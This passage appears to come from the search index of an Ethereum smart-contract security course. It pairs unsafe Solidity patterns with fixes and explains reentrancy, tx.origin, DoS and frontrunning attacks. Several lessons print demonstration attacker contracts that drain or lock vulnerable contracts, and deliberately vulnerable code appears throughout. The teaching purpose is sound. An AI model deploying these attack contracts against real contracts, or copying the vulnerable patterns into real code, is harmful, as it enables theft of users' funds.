( uint i = 0 ; i < refunds . length ; i ++ ) { refund = refunds [ i ] . value ; refunds [ i ] . value = 0 ; refunds [ i ] . addr . transfer ( refund ); } } function withdrawRefund() external { // Better! require(refunds[msg.sender] > 0); uint refund = refunds[msg.sender]; refunds[msg.sender] = 0; msg.sender.transfer(refund); } Fallback Functions and Data Length Keep fallback functions simple and check data length: fallback() payable external { // Possibly dangerous balances[msg.sender] += msg.value; } receive() external { // Better! balances[msg.sender] += msg.value; } fallback() external { require(msg.data.length == 0); emit LogDeposit(msg.sender); } Checks-Effects-Interactions Avoid state changes after external calls, to avoid things like the DAO hack: function withdraw ( uint amount ) public { // Possibly dangerous require(balances [ msg.sender ] >= amount) ; msg.sender.call{ value : amount } ( \"\" ); balances [ msg.sender ] - = amount ; } function withdraw ( uint amount ) public { // Better! require(balances [ msg.sender ] >= amount) ; balances [ msg.sender ] -= amount ; msg.sender.call{ value : amount } ( \"\" ); } Proper use of call , delegatecall instead of send , transfer After the Istanbul hardfork, it's recommended not to use send and transfer , and instead use call.value contract Vulnerable { // Possibly dangerous function withdraw ( uint256 amount ) external { // This forwards 2300 gas , which may not be enough if the recipient // is a contract and gas costs change . msg . sender . transfer ( amount ) ; } } contract Fixed { // Better! function withdraw(uint256 amount) external { // This forwards all available gas. Be sure to check the return value! (bool success, ) = msg.sender.call{ value : amount } ( \"\" ); require ( success , \"Transfer failed.\" ); } } And then proper use of call and delegatecall : addr.call(abi.encodeWithSignature(\"f(uint)\", a)); Used to call functions and send ether Allows specify gas Returns boolean Does not propagate exceptions addr.delegatecall(abi.encodeWithSignature(\"f(uint)\", a)); Used to run functions within the caller's context (library feature) Allows specify gas Returns boolean Does not propagate exceptions Additional Material Wiki: Smart Contract Best Practices (ConsenSys) Article: Stop Using Solidity's transfer Article from ConsenSys Diligence","title":"Index"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#solidity-pitfalls-and-attacks","text":"As we've made clear again and again, smart contract development is potentially very dangerous. This is unlike the vast portion of web development, where environments and code can be torn down, changed, and easily deployed again. Because of this, being a smart contract developer means being acutely aware of the ways in which your code can be exploited and creating safety features to ensure against unforeseen attacks. Over the next few sections, we're going to be discussing smart contract security. We'll start by going over some common pitfalls and attacks with Solidity (as a language) and smart contracts generally. We'll then discuss testing as a means to further protect your code. Last, we'll go over some security services you can use when writing and developing smart contracts","title":"Solidity Pitfalls and Attacks"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#solidity-tips","text":"","title":"Solidity Tips"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#use-specific-compiler-pragma","text":"A common method is to use the ^ to indicate the lowest compiler version that your contract will work with. However, if you have a testing suite you've built against your contract, you should not include the ^ and just list the compiler version. pragma solidity ^0.4.4; // Possibly dangerous pragma solidity 0.4.4; // Better","title":"Use Specific Compiler Pragma"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#built-in-variable-names","text":"Built-in variables can be shadowed, be careful when naming your functions: function revert() internal pure {} // Possibly dangerous function myRevert() internal pure {} // Better","title":"Built-In Variable Names"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#proper-use-of-require-assert-and-revert","text":"require(msg.sender == owner) * Validation of inputs, external call returns and variables before state changes * Refunds remaining gas when fail * Should be used more often and towards the beginning of functions assert(age > 100) * Validation of invariants , situations that should never happen and variables after state changes * Consumes all gas when fail * Should be used less often and towards the end of functions revert() * Reverts the current transaction * Refunds remaining gas when fail * Used within if-else statements","title":"Proper Use of require, assert and revert"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#use-modifiers-only-for-validations","text":"Just do validations within modifiers and avoid external calls on them: modifier partnerShare() { // Possibly dangerous partner.transfer(msg.value / 10); _; } modifier onlyOwner() { // Better! require(msg.sender == owner); _; }","title":"Use Modifiers Only for Validations"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#pull-over-push","text":"Prioritize receiving contract calls over making contract calls: function doRefund () external onlyOwner { // Possibly dangerous uint refund ; for ( uint i = 0 ; i < refunds . length ; i ++ ) { refund = refunds [ i ] . value ; refunds [ i ] . value = 0 ; refunds [ i ] . addr . transfer ( refund ); } } function withdrawRefund() external { // Better! require(refunds[msg.sender] > 0); uint refund = refunds[msg.sender]; refunds[msg.sender] = 0; msg.sender.transfer(refund); }","title":"Pull Over Push"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#fallback-functions-and-data-length","text":"Keep fallback functions simple and check data length: fallback() payable external { // Possibly dangerous balances[msg.sender] += msg.value; } receive() external { // Better! balances[msg.sender] += msg.value; } fallback() external { require(msg.data.length == 0); emit LogDeposit(msg.sender); }","title":"Fallback Functions and Data Length"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#checks-effects-interactions","text":"Avoid state changes after external calls, to avoid things like the DAO hack: function withdraw ( uint amount ) public { // Possibly dangerous require(balances [ msg.sender ] >= amount) ; msg.sender.call{ value : amount } ( \"\" ); balances [ msg.sender ] - = amount ; } function withdraw ( uint amount ) public { // Better! require(balances [ msg.sender ] >= amount) ; balances [ msg.sender ] -= amount ; msg.sender.call{ value : amount } ( \"\" ); }","title":"Checks-Effects-Interactions"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#proper-use-of-call-delegatecall-instead-of-send-transfer","text":"After the Istanbul hardfork, it's recommended not to use send and transfer , and instead use call.value contract Vulnerable { // Possibly dangerous function withdraw ( uint256 amount ) external { // This forwards 2300 gas , which may not be enough if the recipient // is a contract and gas costs change . msg . sender . transfer ( amount ) ; } } contract Fixed { // Better! function withdraw(uint256 amount) external { // This forwards all available gas. Be sure to check the return value! (bool success, ) = msg.sender.call{ value : amount } ( \"\" ); require ( success , \"Transfer failed.\" ); } } And then proper use of call and delegatecall : addr.call(abi.encodeWithSignature(\"f(uint)\", a)); Used to call functions and send ether Allows specify gas Returns boolean Does not propagate exceptions addr.delegatecall(abi.encodeWithSignature(\"f(uint)\", a)); Used to run functions within the caller's context (library feature) Allows specify gas Returns boolean Does not propagate exceptions","title":"Proper use of call, delegatecall instead of send, transfer"},{"location":"S03-smart-contracts/M6-security/L2-solidity-pitfalls-and-attacks/#additional-material","text":"Wiki: Smart Contract Best Practices (ConsenSys) Article: Stop Using Solidity's transfer Article from ConsenSys Diligence","title":"Additional Material"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/","text":"Smart Contract Pitfalls and Attacks Now that we've gone through some of the attack vectors in the language and syntax of Solidity, let's move on to more general smart contract pitfalls and attacks. These are more general attack patterns which involve zooming out from a codeline level to a broader contract workflow view ( Call Known Attacks ). There are also concerns that come from a protocol level, which will require marrying the information we learned in the first few sections of the course with the smart contract knowledge you gained (Network Known Attacks). All these attack vectors (and more) are compiled in the Smart Contract Weakness Classification and Test Cases or SWC Registry , we'll reference attack vectors by their SWC index number: Network Known Attacks: * Front-Running ( SWC-114 ) * Timestamp Dependence ( SWC-116 ) * Network Stuffing DoS Call Known Attacks: * Forcibly Sending Ether ( SWC-132 ) * Block Gas Limit DoS ( SWC-128 {target=_blank}) * Reentrancy ( SWC-107 {target=_blank}) * Integer Overflow/Underflow ( SWC-101 {target=_blank}) * Unexpected Revert DoS ( SWC-113 {target=_blank}) * Tx.Origin Authentication ( SWC-115 ) Frontrunning Frontrunning has become a big issue in the Ethereum community as related to Miner-Extracted Value (MEV), which we discussed earlier. Frontrunning exploits how transactions are included in the blockchain and considerations around the process. Transactions that are broadcast to the network but have not yet been included in a block are in the mempool. Miners choose the order in which to include transactions from the mempool into a block that they are mining. Also, since transactions are in the mempool before they make it into a block, anyone can know what transactions are about to occur on the network. This can be problematic for things like decentralized markets. Protecting against this is difficult and you will likely need to devise contract specific solutions. Decentralized markets can mitigate concerns by implementing batch auctions or using a pre-commit scheme, where the details are submitted after the transaction is committed. More information about Transaction Order Dependence and concrete samples are available in the corresponding SWC Registry entry. Due to the increased focus on MEV, we can expect to see a lot more security tips and research around frontrunning. Timestamp Dependence Contracts often need access to time values to perform certain types of functionality. Values such as block.timestamp, and block.number can give you a sense of the current time or a time delta, however, they are not safe to use for most purposes. In the case of block.timestamp, developers often attempt to use it to trigger time-dependent events. As Ethereum is decentralized, nodes can synchronize time only to some degree. Moreover, malicious miners can alter the timestamp of their blocks, especially if they can gain advantages by doing so. ( source ) Network Stuffing DoS This is an attack vector based around time-sensitive operations, such as an auction or a time-locked wallet, or operations requiring user input before committing an irreversible action. Essentially, we need to guard against the fact that, particularly now, there can be moments of high-traffic (not even malicious) where it can be near-impossible to get one's transactions to a smart contract. We hope with EIP-1559 these moments are short, but they may exist. As such, we need to make sure time-sensitive operations have some fallback or failsafe mechanism to guard against network stuffing, malicious or otherwise. Forcibly Sending Ether Another danger is using logic that depends on the contract balance. Be aware that it is possible to send ether to a contract without triggering its fallback function. Using the selfdestruct function on another contract and using the target contract as the recipient will force the destroyed contract\u2019s funds to be sent to the target. It is also possible to pre-compute a contracts address and send ether to the address before the contract is deployed see ( CREATE2 ). The contract\u2019s balance will be greater than 0 when it is finally deployed. Block Gas Limit DoS There is a limit to how much computation can be included in a single Ethereum block, currently 10,000,000 gas worth. This means that if your smart contract reaches a state where a transaction requires more than 10,000,000 gas to execute, that transaction will never successfully execute ( SWC-128 {target=_blank}). It will always reach the block gas limit before finishing. Similarly, if the require gas for the transaction is sub 8,000,000, but close to it, you may have a harder time getting your transaction included in a block by a miner. It is more likely that if you send a transaction to the network with a startGas close to 8,000,000, a miner will not pick the transaction to include in a block. You can find more info about the default mining transaction ordering options in the most popular clients here. This situation becomes possible if your contract loops over an array of undetermined size. If the array becomes too large it may never execute. A concrete sample of a dynamic array potentially resulting in a denial of service is available at the SWC Registry entry here. Reentrancy Reentrancy attacks ( SWC-107 {target=_blank}) are very well-known thanks to the infamous DAO hack that happened on the Ethereum network. In a reentrancy attack, a vulnerable contract sends ether to an unknown address that contains a fallback function. Then, a malicious code calls back repeatedly a function in the vulnerable contract before the first call be finished. // Vulnerable contract function withdraw ( uint _amount ) public { require ( balances [ msg . sender ] >= _amount , \"Not enough balance!\" ) ; msg . sender . call . value ( _amount )( \"\" ) ; balances [ msg . sender ] -= _amount ; } // Malicious contract function () payable external { if ( address ( vulnerableContract ) . balance > 1 ether ) { vulnerableContract . withdraw ( 1 ether ) ; } } If you can\u2019t remove the external call, the next simplest way to prevent this attack is to do the internal work before making the external function call. mapping (address => uint) private userBalances; // Better! function withdrawBalance() public { uint amountToWithdraw = userBalances[msg.sender]; userBalances[msg.sender] = 0; // The user's balance is already 0, so future invocations won't withdraw anything require(msg.sender.call.value(amountToWithdraw)()); } Or to use the withdrawal design pattern and separate the contract accounting logic and the transfer logic. Another thing to be aware of is potential cross function re-entrancy. This can be problematic if your contract has multiple functions that modify the same state. // INSECURE mapping ( address => uint ) private userBalances ; function transfer ( address to , uint amount ) { if ( userBalances [ msg.sender ] >= amount ) { userBalances [ to ] += amount ; userBalances [ msg.sender ] -= amount ; } } function withdrawBalance () public { uint amountToWithdraw = userBalances [ msg.sender ] ; // At this point , the caller ' s code is executed , and can call transfer () require ( msg . sender . call . value ( amountToWithdraw )()); userBalances [ msg.sender ] = 0 ; } In this case, the attacker can call transfer() when their code is executed on the external call in withdrawBalance. Since their balance has not yet been set to 0, they are able to transfer the tokens even though they already received the withdrawal. This vulnerability was also used in the DAO attack. There are several ways to mitigate these problems. The first is the Check-Effect-Interaction design pattern we described earlier. It is generally a good idea to handle the flow of a function like so: * Check Test condition. eg require * Effect Update state variable (eg update balance) * Interaction Interact with external contract (eg send ether using call.value ) In short, you handle your internal contract state changes before calling external contracts. A more complex solution could implement mutual exclusion, or a mutex. This allows you to lock a state and only allow changes by the owner of the lock. You can see an example of a mutex in Solidity here. You can dig deeper into known attacks such as these here. Integer Under / Overflow Note: With the inclusion of SafeMath natively with Solidity 0.8.x, the likelihood of writing an integer under / overflow is unlikely. However, this is still an issue that exists in the wild and there are edge cases in which it could be achieved. Integers can underflow or overflow in the EVM ( SWC-101 {target=_blank}). This happens when an arithmetic value oversteps the minimum or maximum size of a type. The max value for an unsigned integer is 2 ^ 256 - 1, which is roughly 1.15 times 10 ^ 77. If an integer overflows, the value will go back to 0. For example, a variable called score of type uint8 storing a value of 255 that is incremented by 1 will now be storing the value 0. You may or may not have to worry about integer overflow depending on your smart contract. A variable that can be set by user input may need to check against overflow, whereas it is infeasible that a variable that is incremented will ever approach this max value. Underflow is a similar situation, but when a uint goes below its minimum value it will be set to its maximum value. Be careful with smaller data types like uint8, uint16, etc\u2026 they can more easily reach their maximum value More information and concrete examples can be found at the corresponding SWC Registry entry Unexpected Revert DoS This attack basically consists of make a vulnerable contract inoperable by forcing a failure or an awaiting situation, locking temporarily or permanently the contract execution ( SWC-113 {target=_blank}). // INSECURE contract Auction { address currentLeader ; uint highestBid ; function bid () payable { require ( msg . value > highestBid ) ; // Refund the old leader , if it fails then revert require ( currentLeader . send ( highestBid )) ; currentLeader = msg . sender ; highestBid = msg . value ; } } In the provided example, the highestBidder could be another contract and transferring funds to the contract triggers the contract\u2019s fallback function. If the contract\u2019s fallback always reverts, the Auction contract\u2019s bid function becomes unusable - it will always revert. The bid function requires the transfer operation to succeed to fully execute. The contract at the provided address throws an exception, execution halts and the exception is passed into the calling contract and prevents further execution. This problem is avoidable using the withdrawal pattern and push-pull. You could also use a multisig contract, expire time or another technique as an emergency plan for possible lock situations. tx.origin Authentication This kind of attack happens when a vulnerable contract uses tx.origin for authentication. An attacker can induce the owner of the vulnerable contract make a call to a malicious contract. Then, a malicious code calls the vulnerable contract, taking advantage of the owner authorizations. // Vulnerable contract function withdraw(address payable _recipient) public { require(tx.origin == owner); _recipient.transfer(address(this).balance); } // Malicious contract function() external payable { vulnerableContract.withdraw(attackerAddress); } An example of this was the Poly Network hack, although not on the Ethereum network. There are always more attack vectors, be sure to look through the SWC registry, follow Diligence on Twitter , or whatever source you need to make sure you stay up to date with security on Ethereum. Additional Material Wiki: Smart Contract Best Practices and Recommendations Article: Ethereum is a Dark Forest A long, comprehensive article discussing frontrunning from a first-person perspective. Got a lot of people's attention in the community around the topic. Wiki: Flashbots A collection of research and news about Miner Extracted Value and Frontrunning. Article: Smart Contract Bugs and Security Best Practices Article: To Sink Frontrunners, Send in the Submarines An article discussing a frontrunning defense mechanism Article: Protect Your Solidity Smart Contracts from Reentrancy Discusses mutex locks in Solidity.","title":"Index"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#smart-contract-pitfalls-and-attacks","text":"Now that we've gone through some of the attack vectors in the language and syntax of Solidity, let's move on to more general smart contract pitfalls and attacks. These are more general attack patterns which involve zooming out from a codeline level to a broader contract workflow view ( Call Known Attacks ). There are also concerns that come from a protocol level, which will require marrying the information we learned in the first few sections of the course with the smart contract knowledge you gained (Network Known Attacks). All these attack vectors (and more) are compiled in the Smart Contract Weakness Classification and Test Cases or SWC Registry , we'll reference attack vectors by their SWC index number: Network Known Attacks: * Front-Running ( SWC-114 ) * Timestamp Dependence ( SWC-116 ) * Network Stuffing DoS Call Known Attacks: * Forcibly Sending Ether ( SWC-132 ) * Block Gas Limit DoS ( SWC-128 {target=_blank}) * Reentrancy ( SWC-107 {target=_blank}) * Integer Overflow/Underflow ( SWC-101 {target=_blank}) * Unexpected Revert DoS ( SWC-113 {target=_blank}) * Tx.Origin Authentication ( SWC-115 )","title":"Smart Contract Pitfalls and Attacks"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#frontrunning","text":"Frontrunning has become a big issue in the Ethereum community as related to Miner-Extracted Value (MEV), which we discussed earlier. Frontrunning exploits how transactions are included in the blockchain and considerations around the process. Transactions that are broadcast to the network but have not yet been included in a block are in the mempool. Miners choose the order in which to include transactions from the mempool into a block that they are mining. Also, since transactions are in the mempool before they make it into a block, anyone can know what transactions are about to occur on the network. This can be problematic for things like decentralized markets. Protecting against this is difficult and you will likely need to devise contract specific solutions. Decentralized markets can mitigate concerns by implementing batch auctions or using a pre-commit scheme, where the details are submitted after the transaction is committed. More information about Transaction Order Dependence and concrete samples are available in the corresponding SWC Registry entry. Due to the increased focus on MEV, we can expect to see a lot more security tips and research around frontrunning.","title":"Frontrunning"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#timestamp-dependence","text":"Contracts often need access to time values to perform certain types of functionality. Values such as block.timestamp, and block.number can give you a sense of the current time or a time delta, however, they are not safe to use for most purposes. In the case of block.timestamp, developers often attempt to use it to trigger time-dependent events. As Ethereum is decentralized, nodes can synchronize time only to some degree. Moreover, malicious miners can alter the timestamp of their blocks, especially if they can gain advantages by doing so. ( source )","title":"Timestamp Dependence"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#network-stuffing-dos","text":"This is an attack vector based around time-sensitive operations, such as an auction or a time-locked wallet, or operations requiring user input before committing an irreversible action. Essentially, we need to guard against the fact that, particularly now, there can be moments of high-traffic (not even malicious) where it can be near-impossible to get one's transactions to a smart contract. We hope with EIP-1559 these moments are short, but they may exist. As such, we need to make sure time-sensitive operations have some fallback or failsafe mechanism to guard against network stuffing, malicious or otherwise.","title":"Network Stuffing DoS"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#forcibly-sending-ether","text":"Another danger is using logic that depends on the contract balance. Be aware that it is possible to send ether to a contract without triggering its fallback function. Using the selfdestruct function on another contract and using the target contract as the recipient will force the destroyed contract\u2019s funds to be sent to the target. It is also possible to pre-compute a contracts address and send ether to the address before the contract is deployed see ( CREATE2 ). The contract\u2019s balance will be greater than 0 when it is finally deployed.","title":"Forcibly Sending Ether"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#block-gas-limit-dos","text":"There is a limit to how much computation can be included in a single Ethereum block, currently 10,000,000 gas worth. This means that if your smart contract reaches a state where a transaction requires more than 10,000,000 gas to execute, that transaction will never successfully execute ( SWC-128 {target=_blank}). It will always reach the block gas limit before finishing. Similarly, if the require gas for the transaction is sub 8,000,000, but close to it, you may have a harder time getting your transaction included in a block by a miner. It is more likely that if you send a transaction to the network with a startGas close to 8,000,000, a miner will not pick the transaction to include in a block. You can find more info about the default mining transaction ordering options in the most popular clients here. This situation becomes possible if your contract loops over an array of undetermined size. If the array becomes too large it may never execute. A concrete sample of a dynamic array potentially resulting in a denial of service is available at the SWC Registry entry here.","title":"Block Gas Limit DoS"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#reentrancy","text":"Reentrancy attacks ( SWC-107 {target=_blank}) are very well-known thanks to the infamous DAO hack that happened on the Ethereum network. In a reentrancy attack, a vulnerable contract sends ether to an unknown address that contains a fallback function. Then, a malicious code calls back repeatedly a function in the vulnerable contract before the first call be finished. // Vulnerable contract function withdraw ( uint _amount ) public { require ( balances [ msg . sender ] >= _amount , \"Not enough balance!\" ) ; msg . sender . call . value ( _amount )( \"\" ) ; balances [ msg . sender ] -= _amount ; } // Malicious contract function () payable external { if ( address ( vulnerableContract ) . balance > 1 ether ) { vulnerableContract . withdraw ( 1 ether ) ; } } If you can\u2019t remove the external call, the next simplest way to prevent this attack is to do the internal work before making the external function call. mapping (address => uint) private userBalances; // Better! function withdrawBalance() public { uint amountToWithdraw = userBalances[msg.sender]; userBalances[msg.sender] = 0; // The user's balance is already 0, so future invocations won't withdraw anything require(msg.sender.call.value(amountToWithdraw)()); } Or to use the withdrawal design pattern and separate the contract accounting logic and the transfer logic. Another thing to be aware of is potential cross function re-entrancy. This can be problematic if your contract has multiple functions that modify the same state. // INSECURE mapping ( address => uint ) private userBalances ; function transfer ( address to , uint amount ) { if ( userBalances [ msg.sender ] >= amount ) { userBalances [ to ] += amount ; userBalances [ msg.sender ] -= amount ; } } function withdrawBalance () public { uint amountToWithdraw = userBalances [ msg.sender ] ; // At this point , the caller ' s code is executed , and can call transfer () require ( msg . sender . call . value ( amountToWithdraw )()); userBalances [ msg.sender ] = 0 ; } In this case, the attacker can call transfer() when their code is executed on the external call in withdrawBalance. Since their balance has not yet been set to 0, they are able to transfer the tokens even though they already received the withdrawal. This vulnerability was also used in the DAO attack. There are several ways to mitigate these problems. The first is the Check-Effect-Interaction design pattern we described earlier. It is generally a good idea to handle the flow of a function like so: * Check Test condition. eg require * Effect Update state variable (eg update balance) * Interaction Interact with external contract (eg send ether using call.value ) In short, you handle your internal contract state changes before calling external contracts. A more complex solution could implement mutual exclusion, or a mutex. This allows you to lock a state and only allow changes by the owner of the lock. You can see an example of a mutex in Solidity here. You can dig deeper into known attacks such as these here.","title":"Reentrancy"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#integer-under-overflow","text":"Note: With the inclusion of SafeMath natively with Solidity 0.8.x, the likelihood of writing an integer under / overflow is unlikely. However, this is still an issue that exists in the wild and there are edge cases in which it could be achieved. Integers can underflow or overflow in the EVM ( SWC-101 {target=_blank}). This happens when an arithmetic value oversteps the minimum or maximum size of a type. The max value for an unsigned integer is 2 ^ 256 - 1, which is roughly 1.15 times 10 ^ 77. If an integer overflows, the value will go back to 0. For example, a variable called score of type uint8 storing a value of 255 that is incremented by 1 will now be storing the value 0. You may or may not have to worry about integer overflow depending on your smart contract. A variable that can be set by user input may need to check against overflow, whereas it is infeasible that a variable that is incremented will ever approach this max value. Underflow is a similar situation, but when a uint goes below its minimum value it will be set to its maximum value. Be careful with smaller data types like uint8, uint16, etc\u2026 they can more easily reach their maximum value More information and concrete examples can be found at the corresponding SWC Registry entry","title":"Integer Under / Overflow"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#unexpected-revert-dos","text":"This attack basically consists of make a vulnerable contract inoperable by forcing a failure or an awaiting situation, locking temporarily or permanently the contract execution ( SWC-113 {target=_blank}). // INSECURE contract Auction { address currentLeader ; uint highestBid ; function bid () payable { require ( msg . value > highestBid ) ; // Refund the old leader , if it fails then revert require ( currentLeader . send ( highestBid )) ; currentLeader = msg . sender ; highestBid = msg . value ; } } In the provided example, the highestBidder could be another contract and transferring funds to the contract triggers the contract\u2019s fallback function. If the contract\u2019s fallback always reverts, the Auction contract\u2019s bid function becomes unusable - it will always revert. The bid function requires the transfer operation to succeed to fully execute. The contract at the provided address throws an exception, execution halts and the exception is passed into the calling contract and prevents further execution. This problem is avoidable using the withdrawal pattern and push-pull. You could also use a multisig contract, expire time or another technique as an emergency plan for possible lock situations.","title":"Unexpected Revert DoS"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#txorigin-authentication","text":"This kind of attack happens when a vulnerable contract uses tx.origin for authentication. An attacker can induce the owner of the vulnerable contract make a call to a malicious contract. Then, a malicious code calls the vulnerable contract, taking advantage of the owner authorizations. // Vulnerable contract function withdraw(address payable _recipient) public { require(tx.origin == owner); _recipient.transfer(address(this).balance); } // Malicious contract function() external payable { vulnerableContract.withdraw(attackerAddress); } An example of this was the Poly Network hack, although not on the Ethereum network. There are always more attack vectors, be sure to look through the SWC registry, follow Diligence on Twitter , or whatever source you need to make sure you stay up to date with security on Ethereum.","title":"tx.origin Authentication"},{"location":"S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/#additional-material","text":"Wiki: Smart Contract Best Practices and Recommendations Article: Ethereum is a Dark Forest A long, comprehensive article discussing frontrunning from a first-person perspective. Got a lot of people's attention in the community around the topic. Wiki: Flashbots A collection of research and news about Miner Extracted Value and Frontrunning. Article: Smart Contract Bugs and Security Best Practices Article: To Sink Frontrunners, Send in the Submarines An article discussing a frontrunning defense mechanism Article: Protect Your Solidity Smart Contracts from Reentrancy Discusses mutex locks in Solidity.","title":"Additional Material"},{"location":"S03-smart-contracts/M6-security/L2b-tx-origin-attack/","text":"TxOrigin Attack (SWC-115) In this lesson we are going to cover a tx.origin attack. The global variable tx.origin in Solidity always references the address of the original sender of the transaction, of the full call chain. See the reference in the docs here. This is different than msg.sender in that msg.sender references the address of the sender of the current call. You should never use tx.origin in Solidity for authorization ( SWC-115 ). The following smart contract shows you why. It is susceptible to attack. pragma solidity > 0 . 5 . 0 ; // Example Tx . Origin Authentication Attack contract VulnerableContract { address payable owner = msg . sender ; function withdraw ( address payable _recipient ) public { require ( tx . origin == owner ) ; _recipient . transfer ( address ( this ) . balance ) ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } function () external payable {} } contract MaliciousContract { VulnerableContract vulnerableContract = VulnerableContract ( 0 x08970FEd061E7747CD9a38d680A601510CB659FB ) ; address payable attackerAddress = 0 xdD870fA1b7C4700F2BD7f44238821C26f7392148 ; function () external payable { vulnerableContract . withdraw ( attackerAddress ) ; } } In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds. Additional Resources: Solidity documentation on the security considerations of tx.origin The SWC Registry entry for Authorization through tx.origin","title":"Index"},{"location":"S03-smart-contracts/M6-security/L2b-tx-origin-attack/#txorigin-attack-swc-115","text":"In this lesson we are going to cover a tx.origin attack. The global variable tx.origin in Solidity always references the address of the original sender of the transaction, of the full call chain. See the reference in the docs here. This is different than msg.sender in that msg.sender references the address of the sender of the current call. You should never use tx.origin in Solidity for authorization ( SWC-115 ). The following smart contract shows you why. It is susceptible to attack. pragma solidity > 0 . 5 . 0 ; // Example Tx . Origin Authentication Attack contract VulnerableContract { address payable owner = msg . sender ; function withdraw ( address payable _recipient ) public { require ( tx . origin == owner ) ; _recipient . transfer ( address ( this ) . balance ) ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } function () external payable {} } contract MaliciousContract { VulnerableContract vulnerableContract = VulnerableContract ( 0 x08970FEd061E7747CD9a38d680A601510CB659FB ) ; address payable attackerAddress = 0 xdD870fA1b7C4700F2BD7f44238821C26f7392148 ; function () external payable { vulnerableContract . withdraw ( attackerAddress ) ; } } In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds. Additional Resources: Solidity documentation on the security considerations of tx.origin The SWC Registry entry for Authorization through tx.origin","title":"TxOrigin Attack (SWC-115)"},{"location":"S03-smart-contracts/M6-security/L2c-dos-attack/","text":"DoS Attack Contract This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert ( SWC-113 ). The VulnerableContract loops over the subscribers array, making a transfer to each address. This is dangerous because when the refundFees() function is called and the VulnerableContract attempts to send funds to the MaliciousContract , the MaliciousContract fallback function is called, which stops execution and reverts. This transaction will never succeed and refundFees() will never successfully execute, preventing any subscribers from getting their subscription fee back. pragma solidity 0 . 8 . 4 ; // Example DenialOfService Attack contract VulnerableContract { address owner = msg . sender ; address payable [] public subscribers ; uint FEE_COST = 1 ether ; function subscribe () public payable { require ( msg . value == FEE_COST , \"Insufficient msg.value\" ) ; subscribers . push ( msg . sender ) ; } function refundFees () public { require ( msg . sender == owner , \"msg.sender should be owner\" ) ; for ( uint i = subscribers . length ; i > 0; i--) { subscribers [ i - 1 ]. transfer ( FEE_COST ) ; subscribers . pop () ; } } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } // Auxiliar function for demo . It wouldn 't be present in a vulnerable contract function removeLastSubscriber() public { subscribers.pop(); } } contract MaliciousContract { VulnerableContract vulnerableContract = VulnerableContract(0x5E72914535f202659083Db3a02C984188Fa26e9f); function subscribe() public payable { vulnerableContract.subscribe.value(msg.value)(); } fallback() external payable { require(false); } }","title":"Index"},{"location":"S03-smart-contracts/M6-security/L2c-dos-attack/#dos-attack-contract","text":"This set of contracts shows how a contract may be susceptible to a denial of service attack by an unexpected revert ( SWC-113 ). The VulnerableContract loops over the subscribers array, making a transfer to each address. This is dangerous because when the refundFees() function is called and the VulnerableContract attempts to send funds to the MaliciousContract , the MaliciousContract fallback function is called, which stops execution and reverts. This transaction will never succeed and refundFees() will never successfully execute, preventing any subscribers from getting their subscription fee back. pragma solidity 0 . 8 . 4 ; // Example DenialOfService Attack contract VulnerableContract { address owner = msg . sender ; address payable [] public subscribers ; uint FEE_COST = 1 ether ; function subscribe () public payable { require ( msg . value == FEE_COST , \"Insufficient msg.value\" ) ; subscribers . push ( msg . sender ) ; } function refundFees () public { require ( msg . sender == owner , \"msg.sender should be owner\" ) ; for ( uint i = subscribers . length ; i > 0; i--) { subscribers [ i - 1 ]. transfer ( FEE_COST ) ; subscribers . pop () ; } } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } // Auxiliar function for demo . It wouldn 't be present in a vulnerable contract function removeLastSubscriber() public { subscribers.pop(); } } contract MaliciousContract { VulnerableContract vulnerableContract = VulnerableContract(0x5E72914535f202659083Db3a02C984188Fa26e9f); function subscribe() public payable { vulnerableContract.subscribe.value(msg.value)(); } fallback() external payable { require(false); } }","title":"DoS Attack Contract"},{"location":"S03-smart-contracts/M6-security/L2d-reentrancy-attack/","text":"Reentrancy Example This set of contracts shows what a reentrancy attack ( SWC-107 ) looks like. pragma solidity 0 . 8 . 2 ; // Example Reentrancy Attack contract VulnerableContract { mapping ( address => uint ) public balances ; function deposit () public payable { require ( msg . value > 1 ) ; balances [ msg . sender ] += msg . value ; } function withdraw ( uint _amount ) public { require ( balances [ msg . sender ] >= _amount , \"Not enough balance!\" ) ; msg . sender . call . value ( _amount )( \"\" ) ; balances [ msg . sender ] -= _amount ; } function getBalance () view public returns ( uint ) { return address ( this ) . balance ; } fallback () payable external {} } contract MaliciousContract { VulnerableContract vulnerableContract = VulnerableContract ( 0 x08970FEd061E7747CD9a38d680A601510CB659FB ) ; function deposit () public payable { vulnerableContract . deposit . value ( msg . value )() ; } function withdraw () public { vulnerableContract . 